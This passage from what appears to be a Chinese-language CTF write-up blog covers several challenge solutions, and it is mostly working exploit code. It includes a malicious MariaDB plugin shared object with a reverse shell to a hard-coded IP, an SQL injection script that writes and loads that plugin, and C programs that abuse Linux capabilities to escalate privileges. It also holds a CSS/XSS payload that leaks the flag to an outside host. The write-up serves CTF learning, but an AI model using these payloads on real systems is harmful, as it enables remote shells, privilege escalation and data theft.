0&gt;&amp;1 &amp;&#x27;&quot;);&#125;class LOLITA &#123;public: LOLITA()&#123; lshell(); &#125;&#125;;LOLITA lolita;LOLITA* _mysql_plugin_interface_version_ = &amp;lolita;//compile: g++ expso.cpp -shared -fPIC -o exp.so 以及来自 DJB 的 12345678// gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init()&#123; system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1&#x27;&quot;);&#125; 1gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc -nostartfiles -nolibc 这两个选项比较高级，嵌入式系统常使用 写入 123456f = open(&quot;preaload.so&quot;, &#x27;rb&#x27;)xid = &quot;1; select unhex(&#x27;&quot; + &#x27;&#x27;.join([&#x27;%02X&#x27; % b for b in bytes(f.read())]) + &quot;&#x27;) into dumpfile &#x27;/mysql/plugin/lolita.so&#x27;;&quot;res = requests.post(url, data=&#123; &quot;id&quot;: xid&#125;)print(res.text) 或者 NESE 大爹的写法 11; select from_base64(&#x27;xx&#x27;) into dumpfile &#x27;/mysql/plugin/xxx.so&#x27;; % ：表示格式说明符的起始。 0 ：表示使用零来填充字段宽度，如果转换的值不足指定的宽度。 2 ：表示字段的最小宽度，即输出的字符串中至少会有两个字符。 X ：表示要将整数以十六进制形式输出，并且使用大写字母。 写进去还没完，由于没有 mysql 库，得先创造个 mysql 库，👴真是太菜了，👴要学！！！ 123CREATE DATABASE IF NOT EXISTS mysql;use mysql;CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT &#x27;&#x27; NOT NULL, dl varchar(128) DEFAULT &#x27;&#x27; NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=&#x27;MySQL plugins&#x27;; 121;create database mysql;create table mysql.plugin(name varchar(64), dl varchar(128));INSTALL PLUGIN testx SONAME &#x27;lolita.so&#x27;; CREATE TABLE IF NOT EXISTS plugin : 这部分开始了一个创建表的 SQL 语句。 IF NOT EXISTS 部分表示如果同名的表已经存在，就不再创建，以避免重复创建。 ( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL) : 这一部分定义了表的列。具体解释如下： name varchar(64) : 创建一个名为 “name” 的列，其数据类型为 VARCHAR，最大长度为 64 个字符。这个列存储插件的名称。 dl varchar(128) : 创建一个名为 “dl” 的列，其数据类型为 VARCHAR，最大长度为 128 个字符。这个列存储插件的下载链接。 DEFAULT '' : 这部分指定了如果没有提供值，这两个列的默认值是空字符串。 NOT NULL : 这部分指定了这两列是非空的，也就是说，插入数据时必须为它们提供值。 PRIMARY KEY (name) : 这一部分定义了一个主键约束。它指定 “name” 列作为主键，这意味着 “name” 列中的值必须是唯一的，用于唯一标识每个插件。 engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci : 这部分定义了表的引擎、事务性、字符集和排序规则。 engine=Aria : 表使用 Aria 存储引擎。 transactional=1 : 表被指定为事务性表。 CHARACTER SET utf8mb3 : 表的字符集被设置为 UTF-8 MB3。 COLLATE utf8mb3_general_ci : 表的排序规则被设置为 UTF-8 MB3 的通用不区分大小写排序规则。 comment='MySQL plugins' : 这一部分可以用于提供表的注释或描述。在这种情况下，表的注释是 “MySQL plugins”，以便更好地理解表的用途。 👴给你详细地介绍一下怎么个事，算是介绍一个建表模板了，避免以后建表出 bug. 接下来加载恶意 so 文件，弹 shell 成功 11;INSTALL PLUGIN lolita SONAME &#x27;lolita.so&#x27;; 然而这可并不是终点，阿米诺斯，flag 没权限读 1find / -exec getcap &#123;&#125; ; 2&gt;/dev/null 对每个文件运行 getcap 命令，以查看文件是否拥有 &quot;capabilities&quot; 属性。而 -exec 部分是用于执行这个检查的命令， &#123;&#125; 是占位符 getcap 是 Linux 命令行工具，用于检查和显示文件的 &quot;capabilities&quot;。它允许你查看与特定文件或可执行文件相关联的 &quot;capabilities&quot; # 牛魔的什么事 capabilities 权限😓 linux setcap 命令详解 (包括各个 cap 的使用举例)_xiedy001 的博客 - CSDN 博客 Linux 提权之 Capabilities 提权（一） - FreeBuf 网络安全行业门户 来自 lolita 小改改 (bushi) 的❤ &quot;capabilities&quot; 权限是 Linux 内核引入的，用于精细划分超级用户权限的领域 说白了，root 被分权了，capabilities 继承一部分. CAP_NET_BIND_SERVICE ：允许绑定小于 1024 的网络端口。 CAP_SYS_ADMIN ：允许执行一些系统管理任务，如挂载文件系统。 CAP_DAC_OVERRIDE ：允许忽略文件的传统 Unix 权限。 CAP_SYS_PTRACE ：允许跟踪其他进程。 CAP_SETUID ：允许进程改变其有效用户 ID。 capability 名称 描述 CAPAUDITCONTROL 启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则 CAPAUDITREAD 允许通过 multicast netlink 套接字读取审计日志 CAPAUDITWRITE 将记录写入内核审计日志 CAPBLOCKSUSPEND 使用可以阻止系统挂起的特性 CAP_CHOWN 修改文件所有者的权限 CAPDACOVERRIDE 忽略文件的 DAC 访问限制 CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制 CAP_FOWNER 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 CAP_FSETID 允许设置文件的 setuid 位 CAPIPCLOCK 允许锁定共享内存片段 CAPIPCOWNER 忽略 IPC 所有权检查 CAP_KILL 允许对不属于自己的进程发送信号 CAP_LEASE 允许修改文件锁的 FL_LEASE 标志 CAPLINUXIMMUTABLE 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 CAPMACADMIN 允许 MAC 配置或状态更改 CAPMACOVERRIDE 忽略文件的 DAC 访问限制 CAP_MKNOD 允许使用 mknod () 系统调用 CAPNETADMIN 允许执行网络管理任务 CAPNETBIND_SERVICE 允许绑定到小于 1024 的端口 CAPNETBROADCAST 允许网络广播和多播访问 CAPNETRAW 允许使用原始套接字 CAP_SETGID 允许改变进程的 GID CAP_SETFCAP 允许为文件设置任意的 capabilities CAP_SETPCAP 参考 capabilities man page CAP_SETUID 允许改变进程的 UID CAPSYSADMIN 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 CAPSYSBOOT 允许重新启动系统 CAPSYSCHROOT 允许使用 chroot () 系统调用 CAPSYSMODULE 允许插入和删除内核模块 CAPSYSNICE 允许提升优先级及设置其他进程的优先级 CAPSYSPACCT 允许执行进程的 BSD 式审计 CAPSYSPTRACE 允许跟踪任何进程 CAPSYSRAWIO 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 CAPSYSRESOURCE 忽略资源限制 CAPSYSTIME 允许改变系统时钟 CAPSYSTTY_CONFIG 允许配置 TTY 设备 CAP_SYSLOG 允许使用 syslog () 系统调用 CAPWAKEALARM 允许触发一些能唤醒系统的东西 (比如 CLOCKBOOTTIMEALARM 计时器) 设置与删除 Capabilities 12setcap cap_sys_admin+ep /usr/sbin/python #设置capabilities权限setcap -r /usr/sbin/python #移除capabilities权限 查找 Capabilities 的文件 12getcap -r / 2&gt;/dev/nullfind / -exec getcap &#123;&#125; ; 2&gt;/dev/null 这里 maraidb 有 cap_setfcap 的权限，允许为文件设置任意的 capabilities. # 其一 写个 readflag 12345678910111213141516#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;// gcc readflag.c -o readflagint main() &#123; char *buffer[1024]; setuid(0); FILE* f = fopen(&quot;/flag&quot;, &quot;r&quot;); fread(buffer, 1024, 1, f); fclose(f); printf(&quot;%s\\n&quot;, buffer);&#125; 万能的 base64 写一切 再写一个调用 cap_set_file 给 readflag 挂上 cap_setuid=ep 之后用 mariadb 加载恶意 so, mariadb –plugin-dir=/mysql/plugin/ –default-auth=setcap 123456789101112131415#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;sys/capability.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;// setcap cap_setuid+ep readflag// /usr/bin/mariadb cap_setfcap=ep// gcc -fPIC -shared setcap.c -o setcap.so -lcap__attribute__ ((__constructor__)) void test (void)&#123; cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;); cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap);&#125; cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;); ：这行代码使用 cap_from_text 函数创建一个能力集（capability set）。在 Linux 中，能力集是一种安全机制，用于管理进程对系统资源和操作的访问权限。 cap_setuid+ep 表示启用 &quot;设置用户标识&quot;（ cap_setuid ）和 &quot;提升特权&quot;（ ep ，意味着效果持久），这意味着程序将具有提升权限的能力. 人言：获取 cap_setuid 这种 cap, 然后给 readflag 赋上 cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap); ：给 readflag 上权限 编译 1gcc -fPIC -shared setcap.c -o setcap.so -lcap -lcap 是编译 C/C++ 程序时传递给编译器的选项之一，用于指定链接到 Linux 能力库，一些常见的能力库函数包括 cap_from_text 和 cap_set_file 在这里面 rnm, 编译不出来，本地编译吧。报错:fatal error: sys/capability.h 1sudo apt-get install libcap-dev 解决一下 1mariadb –-plugin-dir=/tmp –-default-auth=cap &amp; # 其二 123456789101112131415161718192021222324252627#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/capability.h&gt;void lshell()&#123; cap_t caps = cap_from_text(&quot;cap_dac_override=eip&quot;); cap_set_file(&quot;/bin/cat&quot;, caps); printf(&quot;setcap finished\\n&quot;);&#125;class LOLITA &#123;public: LOLITA()&#123; lshell(); &#125;&#125;;LOLITA _mysql_client_plugin_declaration_;//compile: g++ evil.c -shared -fPIC -o cap.so -lcap2```将编译出来的文件传到靶机（dd &lt; /dev/tcp/ip/port &gt; cap.so） 加载这个so让/bin/cat获取cap_dac_override（忽略文件权限）的特权 ```mariadb --plugin-dir=. --default-auth=capcat /flag``` # 劫持 php 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;dlfcn.h&gt;// #include &lt;sys/capability.h&gt;typedef void* cap_t;typedef cap_t (*cap_from_text_t)(const char *);typedef int (*cap_set_file_t)(const char *, cap_t);__attribute__((constructor)) void init(int argc, char *argv[]) &#123; printf(&quot;cap.c: init()\\n&quot;); void *handle = dlopen (&quot;/lib/x86_64-linux-gnu/libcap.so.2&quot;, RTLD_LAZY); cap_from_text_t cap_from_text = (cap_from_text_t)dlsym(handle, &quot;cap_from_text&quot;); cap_set_file_t cap_set_file = (cap_set_file_t)dlsym(handle, &quot;cap_set_file&quot;); cap_set_file(&quot;/usr/local/bin/php&quot;, cap_from_text(&quot;cap_setuid+ep&quot;));&#125; 更吊的 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/capability.h&gt;void _init()&#123; cap_t caps = cap_init(); if (caps == NULL) &#123; perror(&quot;cap_init&quot;); exit(EXIT_FAILURE); &#125; cap_value_t cap_list[4]; //cap_list[0] = CAP_SYS_ADMIN; cap_list[0] = CAP_SETFCAP; cap_list[1] = CAP_CHOWN; cap_list[2] = CAP_SETUID; cap_list[3] = CAP_SETGID; if (cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_list, CAP_SET) == -1 || cap_set_flag(caps, CAP_INHERITABLE, 4, cap_list, CAP_SET) == -1 || cap_set_flag(caps, CAP_PERMITTED, 4, cap_list, CAP_SET) == -1) &#123; perror(&quot;cap_set_flag&quot;); cap_free(caps); exit(EXIT_FAILURE); &#125; const char *filename = &quot;/tmp/perl&quot;; if (cap_set_file(filename, caps) == -1) &#123; perror(&quot;cap_set_file&quot;); cap_free(caps); exit(EXIT_FAILURE); &#125; cap_free(caps);&#125; md😡其它几家的反弹 shellpayload 有问题，反弹 shell 了以后就一直连不上 mariadb 了，最后还是用了 lolita 的 exp 打，一遍过，果然 lolita 还是爱我的🥰🥰🥰. 这种终出的感觉谁懂啊，好√Ⅷ 舒服啊，√Ⅷ 好舒服啊. # ytiruces 👴不想复现，环境不好搞，👴贴个 exp 在这 12345678910111213141516171819202122232425262728import stringimport socketpayload = &#x27;https://ytiruces.ctfpunk.com/?content=%3Cp%3E%3Cstyle%3E#style#%3C/style%3E%3Cvideo%20controls%20playsinline%20autoplay%20muted%20loop%3E%3Csource%20src=%22https://n1s.ctf.hurrison.com/test.webm%22%3E%3Ctrack%20src=%22/flag?name=WEBVTT%250a00:00.000--%3E00:13.000%250a%3Cv%22%20default%3E&#x27;flag = &#x27;n1ctf&#123;I&#x27;style = &#x27;::cue(v[voice^=%22&#x27; + flag + &#x27;#x#%22])%20&#123;%20background:%20url(https://n1.ctf.hurrison.com/?f=#x#);%20&#125;%0a&#x27;s = &#x27;&#x27;table = string.ascii_letters + &#x27;&#123;&#x27; + &#x27;&#125;&#x27;for x in table: s += style.replace(&#x27;#x#&#x27;, x)payload = payload.replace(&#x27;#style#&#x27;, s)print(payload)ip = &#x27;119.28.143.13&#x27;port = 32890s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))d = s.recv(256)print(d)s.send(payload.encode()) # ggbond’s gogs 👴真不是懒，没环境复现个钩子，tmd 当👴⭐😡吧. # dockerdebug 123456789#FROM openjdk:8-alpineFROM adoptopenjdk/openjdk11COPY SimpleAPI-1.0-SNAPSHOT.jar /tmp/web.jarCOPY flag /flagCOPY start.sh /start.shRUN chmod +x /start.shENTRYPOINT /start.sh EXPOSE 8877EXPOSE 3345 12345touch /tmp/app.logchmod 666 /tmp/app.lognohup java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:3345 -jar /tmp/web.jar &gt;/tmp/app.log 1docker run -d -p 8877:8877 -p 63342:63342 remote_debug 运行远程连接 debug 专用的端口","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]}],"categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://1llustrious.github.io/tags/WP/"}]}